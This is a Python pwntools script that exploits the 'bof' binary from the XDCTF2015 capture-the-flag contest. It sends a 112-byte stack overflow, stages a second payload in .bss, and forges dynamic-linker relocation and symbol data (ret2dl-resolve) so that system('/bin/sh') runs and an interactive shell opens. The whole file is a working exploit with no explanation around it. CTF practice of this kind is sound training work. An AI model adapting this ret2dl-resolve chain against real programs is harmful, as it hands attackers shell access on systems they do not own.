from pwn import *
from roputils import *

path = './bof'
io = process(path)
# context.log_level = 'debug'

io.recvuntil(b"Welcome to XDCTF2015~!\n")

rop = ROP(path)
offset = 112
bss_base = rop.section('.bss')
buf = rop.fill(offset)

buf += rop.call('read', 0, bss_base, 100)
# used to call dl_runtimeresolve()
buf += rop.dl_resolve_call(bss_base + 20, bss_base)
io.send(buf)

buf = rop.string('/bin/sh')
buf += rop.fill(20, buf)
# used to make faking data, such relocation, Symbol, Str
buf += rop.dl_resolve_data(bss_base + 20, 'system')
buf += rop.fill(100, buf)
io.send(buf)

io.interactive()